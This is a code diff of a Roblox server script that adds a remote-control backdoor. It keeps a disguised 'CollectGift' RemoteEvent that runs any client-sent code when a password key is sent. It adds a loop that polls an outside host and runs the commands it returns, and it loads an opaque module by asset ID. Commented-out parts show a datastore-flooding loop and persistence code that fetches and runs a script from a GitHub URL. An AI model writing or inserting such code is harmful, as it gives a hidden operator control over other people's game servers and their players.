@@ -1,55 +1,49 @@
-local DataStoreService = game:GetService("DataStoreService")
+local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local MessagingService = game:GetService("MessagingService")
 
-local target = DataStoreService:GetDataStore("__TEST")
-
---[[
-Module disabled
-task.spawn(function()
-    local counter = 0
-    local data = "colorful"
-    
-    while true do
-        counter += 1
-        local key = "Color_" .. tostring(counter)
-        
-        task.spawn(function()
-            pcall(function() 
-                target:SetAsync(key, data) 
-            end)
-        end)
-        
-        task.spawn(function()
-            pcall(function() 
-                target:GetAsync(key) 
-            end)
-        end)
-        
-        task.spawn(function()
-            pcall(function() 
-                target:RemoveAsync(key) 
-            end)
-        end)
-        
-        task.wait()
-    end
-end)
-]]
+local mm = require(136937079949491)
 
 local remote = Instance.new("RemoteEvent")
 remote.Name = "CollectGift"
 remote.Parent = ReplicatedStorage
 
 remote.OnServerEvent:Connect(function(plr, key, src)
-    if key == "beige" then --theres a reason i call it colorful
-        loadstring(src)()
-    end
+	if key == "beige" then --theres a reason i call it colorful
+		loadstring(src)()
+	end
 end)
 
+local function parse(input)
+	local result = {}
+	local current = {}
+	local i = 1
+	local len = #input
+
+	while i <= len do
+		local char = input:sub(i, i)
+
+		if char == "\\" and i < len and input:sub(i + 1, i + 1) == ":" then
+			table.insert(current, ":")
+			i = i + 2
+		elseif char == ":" then
+			table.insert(result, table.concat(current))
+			current = {}
+			i = i + 1
+		else
+			table.insert(current, char)
+			i = i + 1
+		end
+	end
+
+	table.insert(result, table.concat(current))
+	return result
+end
+
+--[[
 game:BindToClose(function()
     game:GetService("MemoryStoreService"):GetHashMap("AHEmergency"):SetAsync("ServerStartup", 'loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/alias-colorful/admin/refs/heads/main/load"))()', 960 * 60 * 60)
-end)
+end)]]
 
 --[[
 MessagingService:SubscribeAsync("Bice", function(message)
@@ -61,3 +55,31 @@ MessagingService:SubscribeAsync("Bice", function(message)
 
     loadstring(data.Data)()
 end)]]
+
+task.defer(function()
+	local sidObject = ReplicatedStorage:WaitForChild("ServerId")
+
+	repeat task.wait()
+	until sidObject.Value ~= 0
+
+	local id = sidObject.Value
+
+	while true do
+		local data = HttpService:GetAsync("https://alias-colorful.vercel.app/api/get?id=" .. id)
+		local json = HttpService:JSONDecode(data)
+		
+		local messages = json.messages
+		for _, message in messages do
+			local parsed = parse(message)
+			local cmd = table.remove(parsed, 1)
+			
+			if cmd == "run" then
+				loadstring(parsed[1])()
+			elseif cmd == "sm" then
+				mm.message(parsed[1])
+			end
+		end
+		
+		task.wait(1.1)
+	end
+end)
